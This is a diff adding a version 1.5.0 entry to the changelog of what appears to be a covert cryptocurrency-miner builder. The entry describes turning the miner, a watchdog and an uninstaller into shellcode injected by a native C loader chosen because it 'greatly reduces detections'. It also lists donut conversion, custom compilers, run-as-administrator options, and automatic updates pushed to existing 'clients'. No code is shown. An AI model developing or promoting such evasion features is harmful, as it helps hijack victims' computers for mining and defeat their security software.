@@ -1,3 +1,13 @@
+### v1.5.0 (02/10/2021)
+* **The previous version was supposed to be the last one before the unified miner but I recieved great results by loading everything by Shellcode making it worthwhile to update**
+* Added new Shellcode loader, the miner, watchdog and uninstaller will now be converted into shellcode and injected using a native C loader which greatly reduces detections
+* Added custom tcc C compiler to compile the Shellcode loader
+* Added custom windres resource compiler to allow icons, assembly data and run as administrator for the native C program
+* Added donut to convert .NET programs into Shellcode
+* Added option to disable Shellcode loader
+* Remade and optimized much of the miner and watchdog code
+* Removed old C# loader
+* Renamed Install to Startup due to confusion
 ### v1.4.4 (07/08/2021)
 * **Any old miner using "Online Download" will automatically get this update for any new clients**
 * Now gets the Remote Configuration every 100 minutes
